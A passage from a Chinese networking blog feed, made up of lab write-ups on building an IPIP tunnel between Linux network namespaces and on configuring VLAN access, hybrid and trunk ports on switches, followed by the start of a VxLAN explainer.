</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="ovs">OVS</h2>
<h2 id="ipip-mode">ipip mode</h2>
<p>IPIP是<a href="https://tools.ietf.org/html/rfc2003">RFC 2003中</a>定义的IP over IP隧道。IPIP隧道标头如下所示：</p>
<p>
  <img loading="lazy" src="https://cdn.jsdelivr.net/gh/CylonChau/imgbed/img/image-20221025174038429.png" alt="image-20221025174038429"  /></p>
<h2 id="实验实现一个ipip隧道">实验：实现一个IPIP隧道</h2>
<p><code>ipip</code> 模式需要内核模块 <code>ipip.ko</code>  使用命令查看内核是否加载IPIP模块<code>lsmod | grep ipip</code> ；使用命令<code>modprobe ipip</code> 加载</p>
<p>实验效果，如下图，在两个名称空间内创建一个 tun 设备，然后将该 tun 设备绑定为一个 <code>ipip</code> 隧道。</p>
<p>
  <img loading="lazy" src="https://cdn.jsdelivr.net/gh/CylonChau/imgbed/img/image-20221025174049463.png" alt="image-20221025174049463"  /></p>
<p>创建名称空间及虚拟网卡对</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ip netns add net1
</span></span><span class="line"><span class="cl">ip netns add net2
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">ip link a veth0 type veth peer name br-veth0
</span></span><span class="line"><span class="cl">ip link a veth1 type veth peer name br-veth1
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">ip link set veth0 netns net1
</span></span><span class="line"><span class="cl">ip link set veth1 netns net2
</span></span></code></pre></td></tr></table>
</div>
</div><p>给虚拟网卡对的一端配置地址</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ip addr add 192.168.10.1/24 dev br-veth0
</span></span><span class="line"><span class="cl">ip addr add 192.168.20.1/24 dev br-veth1
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">ip netns exec net1 ip link set veth0 up
</span></span><span class="line"><span class="cl">ip netns exec net2 ip link set veth1 up
</span></span></code></pre></td></tr></table>
</div>
</div><p>在两个名称空间内分别创建一个ipip tunnel</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">netns exec net2 ip tunnel add tun1 mode ipip remote 192.168.10.2 local 192.168.20.2
</span></span><span class="line"><span class="cl">netns exec net1 ip tunnel add tun1 mode ipip remote 192.168.20.2 local 192.168.10.2
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">ip netns exec net1 ip link set tun1 up
</span></span><span class="line"><span class="cl">ip netns exec net2 ip link set tun1 up
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">ip netns exec net1 ip addr add 192.168.100.10 peer 192.168.200.10 dev tun1
</span></span><span class="line"><span class="cl">ip netns exec net2 ip addr add 192.168.200.10 peer 192.168.100.10 dev tun1
</span></span></code></pre></td></tr></table>
</div>
</div><p>这个命令是在对应网络名称空间内创建隧道设备tun1，并设置隧道模式为 <code>ipip</code>，然后还需要设置隧道端点，用 <code>remote</code> 和 <code>local</code> 表示，这是<strong>隧道外层 IP</strong>，对应设置 <strong>隧道内层 IP</strong>，用 <code>ip addr xx peer xx</code> 配置。</p>
<p>分析ipip tunnel过程。</p>
<ol>
<li>首先 ping 命令构建一个 ICMP 请求包，ICMP 包封装在 IP 包中，源目的 IP 地址分别为 <code>tun1(192.168.200.10)</code> 和 <code>tun2(192.168.100.10)</code> 的地址。</li>
<li>由于 tun1 和 tun2 不在同一网段，所以会查路由表，当通过 <code>ip tunnel</code> 命令建立 <code>ipip</code> 隧道之后，会自动生成一条路由，如下，表明去往目的地 <code>192.168.100.10</code> 的路由直接从 tun1 出去。</li>
</ol>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ ip netns <span class="nb">exec</span> net2 route -n
</span></span><span class="line"><span class="cl">Kernel IP routing table
</span></span><span class="line"><span class="cl">Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
</span></span><span class="line"><span class="cl">192.168.10.0    192.168.20.1    255.255.255.0   UG    <span class="m">0</span>      <span class="m">0</span>        <span class="m">0</span> veth1
</span></span><span class="line"><span class="cl">192.168.20.0    0.0.0.0         255.255.255.0   U     <span class="m">0</span>      <span class="m">0</span>        <span class="m">0</span> veth1
</span></span><span class="line"><span class="cl">192.168.100.10  0.0.0.0         255.255.255.255 UH    <span class="m">0</span>      <span class="m">0</span>        <span class="m">0</span> tun1
</span></span></code></pre></td></tr></table>
</div>
</div><ol start="3">
<li>由于配置了隧道端点，数据包出了 tun1，到达 veth1，根据 <code>ipip</code> 隧道的配置，会封装上一层新的 IP 报头，源目的 IP 地址分别为 <code>veth2(192.168.20.2)</code> 和 <code>veth1(192.168.10.2)</code>。</li>
<li>veth2和 veth1不在一个网段，因为手动添加的路由表，发现去往 <code>192.168.10.0</code> 网段从 <code>192.168.20.1</code> veth2虚拟网卡对另外一端 br-veth2出。</li>
<li>因为Linux 打开了 <code>ip_forward</code>，类似于路由器功能，<code>192.168.10.0</code> 和 <code>192.168.20.1</code> 为直连路由，直接有路由器转发。完成了net2到net1的过程。</li>
<li>数据包到达 net1 的 veth1，解封装数据包，发现内层 IP 报文的目的 IP 地址是 <code>192.168.100.10</code>，这正是自己配置的 <code>ipip</code> 隧道的 <code>tun1(192.168.100.10)</code> 地址，于是将报文转交 <code>tun1(192.168.100.10)</code>。</li>
<li>ICMP报文是双向的，故，相通的步骤还要返回到<code>tun1(192.168.200.10)</code> 。</li>
</ol>
<blockquote>
<p><strong>通过抓包工具查看数据包的详细内容</strong></p>
<p>
  <img loading="lazy" src="https://cdn.jsdelivr.net/gh/CylonChau/imgbed/img/image-20221025174102350.png" alt="image-20221025174102350"  /></p>
<p>
  <img loading="lazy" src="https://cdn.jsdelivr.net/gh/CylonChau/imgbed/img/image-20221025174126074.png" alt="image-20221025174126074"  /></p>
</blockquote>
]]></content:encoded>
    </item>
    
    <item>
      <title>网络实验 - VLAN</title>
      <link>https://www.oomkill.com/2021/01/experiment-vlan/</link>
      <pubDate>Sat, 02 Jan 2021 00:00:00 +0000</pubDate>
      
      <guid>https://www.oomkill.com/2021/01/experiment-vlan/</guid>
      <description></description>
      <content:encoded><![CDATA[<p>虚拟局域网VLAN（Virtual Local Area Network），是将一个物理的LAN在逻辑上划分成多个广播域的通信技术。</p>
<p>VLAN内的主机间可以直接通信，而VLAN间不能直接通信，从而将广播报文限制在一个VLAN内。</p>
<p>以太网是一种基于CSMA/CD（Carrier Sense Multiple Access/Collision Detection）的共享通讯介质的数据网络通讯技术。当主机数目较多时会导致冲突严重、广播泛滥、性能显著下降甚至造成网络不可用等问题。通过交换机实现LAN互连虽然可以解决冲突严重的问题，但仍然不能隔离广播报文和提升网络质量。</p>
<p>在这种情况下出现了VLAN技术，这种技术可以把一个LAN划分成多个逻辑的VLAN，每个VLAN是一个广播域，VLAN内的主机间通信就和在一个LAN内一样，而VLAN间则不能直接互通，这样，广播报文就被限制在一个VLAN内。</p>
<h2 id="vlan的作用">VLAN的作用</h2>
<ul>
<li>
<p>限制广播域：广播域被限制在一个VLAN内，节省了带宽，提高了网络处理能力。</p>
</li>
<li>
<p>增强局域网的安全性：不同VLAN内的报文在传输时是相互隔离的，即一个VLAN内的用户不能和其它VLAN内的用户直接通信。</p>
</li>
<li>
<p>提高了网络的健壮性：故障被限制在一个VLAN内，本VLAN内的故障不会影响其他VLAN的正常工作。</p>
</li>
<li>
<p>灵活构建虚拟工作组：用VLAN可以划分不同的用户到不同的工作组，同一工作组的用户也不必局限于某一固定的物理范围，网络构建和维护更方便灵活。</p>
</li>
</ul>
<h2 id="vlan-tag">VLAN Tag</h2>
<p>要使交换机能够分辨不同VLAN的报文，需要在报文中添加标识VLAN信息的字段。IEEE 802.1Q协议规定，在以太网数据帧的目的MAC地址和源MAC地址字段之后、协议类型字段之前加入4个字节的VLAN标签（又称VLAN Tag，简称Tag），用以标识VLAN信息。</p>
<p>
  <img loading="lazy" src="https://cdn.jsdelivr.net/gh/CylonChau/imgbed/img/image-20220506224238271.png" alt="image-20220506224238271"  /></p>
<p>VLAN Tag各字段含义：</p>
<table>
<thead>
<tr>
<th>字段</th>
<th>长度</th>
<th>含义</th>
<th>取值</th>
</tr>
</thead>
<tbody>
<tr>
<td>TPID</td>
<td>2Byte</td>
<td>Tag Protocol Identifier（标签协议标识符），表示数据帧类型。</td>
<td>表示帧类型，取值为0x8100时表示IEEE 802.1Q的VLAN数据帧。如果不支持802.1Q的设备收到这样的帧，会将其丢弃。<br/><br/>各设备厂商可以自定义该字段的值。当邻居设备将TPID值配置为非0x8100时， 为了能够识别这样的报文，实现互通，必须在本设备上修改TPID值，确保和邻居设备的TPID值配置一致。</td>
</tr>
<tr>
<td>PRI</td>
<td>3bit</td>
<td>Priority，表示数据帧的802.1p优先级。</td>
<td>取值范围为0～7，值越大优先级越高。当网络阻塞时，设备优先发送优先级高的数据帧。</td>
</tr>
<tr>
<td>CFI</td>
<td>1bit</td>
<td>Canonical Format Indicator（标准格式指示位），表示MAC地址在不同的传输介质中是否以标准格式进行封装，用于兼容以太网和令牌环网。</td>
<td>CFI取值为0表示MAC地址以标准格式进行封装，为1表示以非标准格式封装。在以太网中，CFI的值为0。</td>
</tr>
<tr>
<td>VID</td>
<td>12bit</td>
<td>VLAN ID，表示该数据帧所属VLAN的编号。</td>
<td>VLAN ID取值范围是0～4095。由于0和4095为协议保留取值，所以VLAN ID的有效取值范围是1～4094。</td>
</tr>
</tbody>
</table>
<p>其中，数据帧中的VID（VLAN ID）字段标识了该数据帧所属的VLAN，数据帧只能在其所属VLAN内进行传输。</p>
<p>对于交换机来说，其内部处理的数据帧都带有VLAN标签，而现网中交换机连接的设备有些只会收发Untagged帧，要与这些设备交互，就需要接口能够识别Untagged帧并在收发时给帧添加、剥除VLAN标签。同时，现网中属于同一个VLAN的用户可能会被连接在不同的交换机上，且跨越交换机的VLAN可能不止一个，如果需要用户间的互通，就需要交换机间的接口能够同时识别和发送多个VLAN的数据帧。</p>
<h2 id="vlan-pvid">VLAN PVID</h2>
<p>缺省VLAN又称PVID（Port Default VLAN ID）。设备处理的数据帧都带Tag，当设备收到UNTagged帧时，就需要给该帧添加Tag，添加什么Tag，就由接口上的缺省VLAN决定。一个物理端口只能拥有一个PVID，当一个物理端口拥有了一个PVID的时候，必定会拥有和PVID相等的VID，而且在这个VID上，这个物理端口必定是Untagged Port。</p>
<p>因此，根据接口连接对象以及对收发数据帧处理的不同，华为定义了4种接口的链路类型：Access、Trunk、Hybrid和QinQ，以适应不同的连接和组网：</p>
<ul>
<li>Access接口：一般用于和不能识别Tag的用户终端（如用户主机、服务器等）相连，或者不需要区分不同VLAN成员时使用。Access接口大部分情况只能收发Untagged帧，且只能为Untagged帧添加唯一的VLAN Tag。</li>
<li>Trunk接口：一般用于连接交换机、路由器、AP以及可同时收发Tagged帧和Untagged帧的语音终端。它可以允许多个VLAN的帧带Tag通过，但只允许一个VLAN的帧从该类接口上发出时不带Tag（即剥除Tag）。</li>
<li>Hybrid接口：既可以用于连接不能识别Tag的用户终端（如用户主机、服务器等）和网络设备（如Hub、傻瓜交换机），也可以用于连接交换机、路由器以及可同时收发Tagged帧和Untagged帧的语音终端、AP。它可以允许多个VLAN的帧带Tag通过，且允许从该类接口发出的帧根据需要配置某些VLAN的帧带Tag（即不剥除Tag）、某些VLAN的帧不带Tag（即剥除Tag）。</li>
<li>使用QinQ（802.1Q-in-802.1Q）协议，一般用于私网与公网之间的连接，也被称为Dot1q-tunnel接口。它可以给帧加上双层Tag，即在原来Tag的基础上，给帧加上一个新的Tag，从而可以支持多达4094×4094个VLAN。</li>
</ul>
<table>
<thead>
<tr>
<th>接口类型</th>
<th>对接收不带Tag的报文处理</th>
<th>对接收带Tag的报文处理</th>
<th>发送帧处理过程</th>
</tr>
</thead>
<tbody>
<tr>
<td>Access接口</td>
<td>接收该报文，并打上缺省的VLAN ID。</td>
<td>当VLAN ID与缺省VLAN ID相同时，接收该报文。<br/>当VLAN ID与缺省VLAN ID不同时，丢弃该报文</td>
<td>先剥离帧的PVID Tag，然后再发送。</td>
</tr>
<tr>
<td>Trunk接口</td>
<td>打上缺省的VLAN ID，当缺省VLAN ID在允许通过的VLAN ID列表里时，接收该报文。<br/>打上缺省的VLAN ID，当缺省VLAN ID不在允许通过的VLAN ID列表里时，丢弃该报文。</td>
<td>当VLAN ID在接口允许通过的VLAN ID列表里时，接收该报文。<br/>当VLAN ID不在接口允许通过的VLAN ID列表里时，丢弃该报文</td>
<td>当VLAN ID与缺省VLAN ID相同，且是该接口允许通过的VLAN ID时，去掉Tag，发送该报文。<br/>当VLAN ID与缺省VLAN ID不同，且是该接口允许通过的VLAN ID时，保持原有Tag，发送该报文。</td>
</tr>
<tr>
<td>Hybrid接口</td>
<td>打上缺省的VLAN ID，当缺省VLAN ID在允许<br/>通过的VLAN ID列表里时，接收该报文。<br/><br/>打上缺省的VLAN ID，当缺省VLAN ID不在允许通过的VLAN ID列表里时，丢弃该报文。</td>
<td>当VLAN ID在接口允许通过的VLAN ID列表里时，接收该报文。<br/>当VLAN ID不在接口允许通过的VLAN ID列表里时，丢弃该报文。</td>
<td>当VLAN ID是该接口允许通过的VLAN ID时，发送该报文。可以通过命令设置发送时是否携带Tag。</td>
</tr>
</tbody>
</table>
<p>由上面各类接口添加或剥除VLAN标签的处理过程可见：</p>
<p>当接收到不带VLAN标签的数据帧时，Access接口、Trunk接口、Hybrid接口都会给数据帧打上VLAN标签，但Trunk接口、Hybrid接口会根据数据帧的VID是否为其允许通过的VLAN来判断是否接收，而Access接口则无条件接收。</p>
<p>当接收到带VLAN标签的数据帧时，Access接口、Trunk接口、Hybrid接口都会根据数据帧的VID是否为其允许通过的VLAN（Access接口允许通过的VLAN就是缺省VLAN）来判断是否接收。</p>
<p>当发送数据帧时：</p>
<ol>
<li>Access接口直接剥离数据帧中的VLAN标签。</li>
<li>Trunk接口只有在数据帧中的VID与接口的PVID相等时才会剥离数据帧中的VLAN标签。</li>
<li>Hybrid接口会根据接口上的配置判断是否剥离数据帧中的VLAN标签。</li>
</ol>
<p>因此，Access接口发出的数据帧肯定不带Tag，Trunk接口发出的数据帧只有一个VLAN的数据帧不带Tag，其他都带VLAN标签，Hybrid接口发出的数据帧可根据需要设置某些VLAN的数据帧带Tag，某些VLAN的数据帧不带Tag。</p>
<h2 id="vlan-access-port">VLAN-Access Port</h2>
<p>Access接口一般用于和不能识别Tag的用户终端（如用户主机、服务器等）相连，或者不需要区分不同VLAN成员时使用。它只能收发Untagged帧，且只能为Untagged帧添加唯一VLAN的Tag。</p>
<p>
  <img loading="lazy" src="https://cdn.jsdelivr.net/gh/CylonChau/imgbed/img/image-20220506225142143.png" alt="image-20220506225142143"  /></p>
<p>配置VLAN access</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">interface GigabitEthernet0/0/1
</span></span><span class="line"><span class="cl">port link-type access
</span></span><span class="line"><span class="cl">port default vlan 10
</span></span></code></pre></td></tr></table>
</div>
</div><p>可以看到收到的包和回来的包并添加VLAN Tag</p>
<p>
  <img loading="lazy" src="https://cdn.jsdelivr.net/gh/CylonChau/imgbed/img/image-20220506225154629.png" alt="image-20220506225154629"  /></p>
<h3 id="vlan-hybrid-port">VLAN-Hybrid Port</h3>
<p>Hybrid接口既可以用于连接不能识别Tag的用户终端（如用户主机、服务器）和网络设备（如Hub），也可用于连接换机、路由器以及可同时收发Tagged帧和Untagged帧的语音终端、AP。它可允许多个VLAN的帧带Tag通过，且允许从该类接口发出的帧根据需要配置某些VLAN的帧带Tag（即不剥除Tag）某些VLAN的帧不带Tag（即剥除Tag）。</p>
<p>![image-20210131144114120](../../../../images/vlan interface/image-20210131144114120.png)</p>
<p>配置Hybrid vlan</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">interface GigabitEthernet0/0/1
</span></span><span class="line"><span class="cl">port hybrid pvid vlan 10
</span></span><span class="line"><span class="cl">port hybrid tagged vlan 10
</span></span></code></pre></td></tr></table>
</div>
</div><p>抓包可以看到对应的Hybrid port收到的</p>
<p>![image-20210131132701528](../../../../images/vlan interface/image-20210131132701528.png)</p>
<p>![image-20210131132642594](../../../../images/vlan interface/image-20210131132642594.png)</p>
<p>实现pc1与pc2都可与pc3互通，pc1与pc2之间不能互通。</p>
<p>![image-20210131195302130](../../../../images/vlan interface/image-20210131195302130.png)</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">system-view
</span></span><span class="line"><span class="cl">sysname SW7
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">interface GigabitEthernet0/0/1
</span></span><span class="line"><span class="cl"># 进来时给包打标签
</span></span><span class="line"><span class="cl">port hybrid pvid vlan 10
</span></span><span class="line"><span class="cl"># 出去时去掉标签
</span></span><span class="line"><span class="cl">port hybrid untagged vlan 10 30
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">interface GigabitEthernet0/0/2
</span></span><span class="line"><span class="cl">port hybrid pvid vlan 20
</span></span><span class="line"><span class="cl">port hybrid untagged vlan 20 30
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">interface GigabitEthernet0/0/3
</span></span><span class="line"><span class="cl">port hybrid pvid vlan 30
</span></span><span class="line"><span class="cl">port hybrid untagged vlan 10 20 30
</span></span></code></pre></td></tr></table>
</div>
</div><p>流程分析：当pc1流量进入SW时会被添加vlan10的tag，在通过vlan30口出去时会进行 <code>port hybrid untagged|tag</code> == <code>port trunk access xxx</code> 这个操作是“是否允许这些tag通过，通过时进行对tag的操作 <code>tag</code> | <code>untag</code> ”</p>
<p><strong>实验</strong></p>
<p>![image-20210131201307039](../../../../images/vlan interface/image-20210131201307039.png)</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">system-view 
</span></span><span class="line"><span class="cl">sysname SW8
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">interface GigabitEthernet0/0/1
</span></span><span class="line"><span class="cl">port hybrid pvid vlan 10
</span></span><span class="line"><span class="cl">port hybrid untagged vlan 20
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">interface GigabitEthernet0/0/2
</span></span><span class="line"><span class="cl">port hybrid pvid vlan 20
</span></span><span class="line"><span class="cl">port hybrid untagged vlan 10
</span></span></code></pre></td></tr></table>
</div>
</div><p>这个实验可以证实，在接口G0/0/1到G0/0/2分配配置了untapped对方vlan的id发现无法ping通。</p>
<p>在默认情况下hybrid只允许vlan1通过，而G0/0/1会被打上vlan10的tag，而到了G0/0/2，此时的标签设置的是双向都设置的为只允许vlan10的通过而不允许vlan20通过，而G0/0/1则相反。所以双方都需要<code>port hybrid untagged vlan 10 20</code></p>
<h2 id="vlan-trunk-port">VLAN-Trunk Port</h2>
<p>Trunk接口一般用于连接交换机、路由器、AP以及可同时收发Tagged帧和Untagged帧的语音终端。它可以允许多个VLAN的帧带Tag通过，但只允许一个VLAN的帧从该类接口上发出时不带Tag（即剥除Tag）。</p>
<p>![image-20210131152952129](../../../../images/vlan interface/image-20210131152952129.png)</p>
<p>配置交换机 4 实现图2 4的论点</p>
<p>![image-20210131172254100](../../../../images/vlan interface/image-20210131172254100.png)</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">system-view
</span></span><span class="line"><span class="cl">sysname SW3
</span></span><span class="line"><span class="cl">vlan batch 10 20
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">interface GigabitEthernet0/0/1
</span></span><span class="line"><span class="cl">port link-type access
</span></span><span class="line"><span class="cl">port default vlan 10
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">interface GigabitEthernet0/0/2
</span></span><span class="line"><span class="cl">port link-type access
</span></span><span class="line"><span class="cl">port default vlan 20
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">interface GigabitEthernet0/0/3
</span></span><span class="line"><span class="cl">port link-type trunk
</span></span><span class="line"><span class="cl">port trunk allow-pass vlan 10 20
</span></span></code></pre></td></tr></table>
</div>
</div><p>SW4</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">system-view
</span></span><span class="line"><span class="cl">sysname SW4
</span></span><span class="line"><span class="cl">vlan batch 10 20
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">interface GigabitEthernet0/0/1
</span></span><span class="line"><span class="cl">port link-type trunk
</span></span><span class="line"><span class="cl">port trunk allow-pass vlan 10 20
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">interface GigabitEthernet0/0/2
</span></span><span class="line"><span class="cl">port link-type access
</span></span><span class="line"><span class="cl">port default vlan 10
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">interface GigabitEthernet0/0/3
</span></span><span class="line"><span class="cl">port link-type access
</span></span><span class="line"><span class="cl">port default vlan 20
</span></span></code></pre></td></tr></table>
</div>
</div><p>![image-20210131193456826](../../../../images/vlan interface/image-20210131193456826.png)</p>
<p>此图完成的是图 1 3步骤的论点</p>
<p>SW5</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">interface GigabitEthernet0/0/1
</span></span><span class="line"><span class="cl">port link-type access
</span></span><span class="line"><span class="cl">port default vlan 10
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">interface GigabitEthernet0/0/2
</span></span><span class="line"><span class="cl">port link-type access
</span></span><span class="line"><span class="cl">port default vlan 10
</span></span></code></pre></td></tr></table>
</div>
</div><p>SW6</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">interface GigabitEthernet0/0/1
</span></span><span class="line"><span class="cl">port link-type trunk
</span></span><span class="line"><span class="cl">port trunk pvid vlan 10
</span></span><span class="line"><span class="cl">port trunk allow-pass vlan 10 20
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">interface GigabitEthernet0/0/2
</span></span><span class="line"><span class="cl">port link-type access
</span></span><span class="line"><span class="cl">port default vlan 10
</span></span></code></pre></td></tr></table>
</div>
</div><p>[vlan.zip](......\images\vlan interface\vlan.zip)</p>
]]></content:encoded>
    </item>
    
    <item>
      <title>网络实验 - VxLAN</title>
      <link>https://www.oomkill.com/2021/01/experiment-vxlan/</link>
      <pubDate>Sat, 02 Jan 2021 00:00:00 +0000</pubDate>
      
      <guid>https://www.oomkill.com/2021/01/experiment-vxlan/</guid>
      <description></description>
      <content:encoded><![CDATA[<h2 id="vxlan概念-实验">vXlan概念 实验</h2>
<h3 id="什么是vxlan">什么是VxLAN</h3>
<p>RFC定义了虚拟扩展局域网 VXLAN （<code>Virtual eXtensible Local Area Network</code>，）扩展方案，是对传统VLAN协议的一种扩展。VXLAN采用 （<code>MAC in UDP（User Datagram Protocol</code>）封装方式，是NVO3（<code>Network Virtualization over Layer 3</code>）中的一种网络虚拟化技术。VXLAN的特点是将L2的以太帧封装到UDP报文（即L2 over  L4）中，并在L3网络中传输。</p>
<p>VXLAN本质上是一种隧道技术，在源网络设备与目的网络设备之间的IP网络上，建立一条逻辑隧道，将用户报文经过特定的封装后通过这条隧道转发。从用户的角度来看，接入网络的服务器就像是连接到了一个虚拟的二层交换机的不同端口上（可把蓝色虚框表示的数据中心VXLAN网络看成一个二层虚拟交换机），可以方便地通信。</p>
<p>
  <img loading="lazy" src="https://cdn.jsdelivr.net/gh/CylonChau/imgbed/img/image-20220506225057747.png" alt="image-20220506225057747"  /></p>
<h3 id="为什么需要vxlan">为什么需要VxLAN</h3>
<p><strong>虚拟机规模受网络设备表项规格的限制</strong></p>
<p>在传统二层网络环境下，数据报文是通过查询MAC地址表进行二层转发。服务器虚拟化后，VM的数量比原有的物理机发生了数量级的增长，伴随而来的便是VM网卡MAC地址数量的空前增加。而接入侧二层设备的MAC地址表规格较小，无法满足快速增长的VM数量。</p>
<p><strong>网络隔离能力有限</strong></p>
<p>VLAN作为当前主流的网络隔离技术，在标准定义中只有12比特，因此可用的VLAN数量仅4096个。对于公有云或其它大型虚拟化云计算服务这种动辄上万甚至更多租户的场景而言，VLAN的隔离能力无法满足。</p>
<p><strong>虚拟机迁移范围受限</strong></p>
<p>由于服务器资源等问题（如CPU过高，内存不够等），虚拟机迁移已经成为了一个常态性业务。</p>
<p><strong>什么是虚拟机动态迁移？</strong></p>
<p>所谓虚拟机动态迁移，是指在保证虚拟机上服务正常运行的同时，将一个虚拟机系统从一个物理服务器移动到另一个物理服务器的过程。该过程对于最终用户来说是无感知的，从而使得管理员能够在不影响用户正常使用的情况下，灵活调配服务器资源，或者对物理服务器进行维修和升级。</p>
<p>在服务器虚拟化后，虚拟机动态迁移变得常态化，为了保证迁移时业务不中断，就要求在虚拟机迁移时，不仅虚拟机的IP地址、MAC地址等参数保持不变，而且虚拟机的运行状态也必须保持原状（例如TCP会话状态），所以虚拟机的动态迁移只能在同一个二层域中进行，而不能跨二层域迁移。</p>
<h3 id="vxlan方案">VxLAN方案</h3>
<p>为了应对传统数据中心网络对服务器虚拟化技术的限制，VXLAN技术应运而生，其能够很好的解决上述问题。</p>
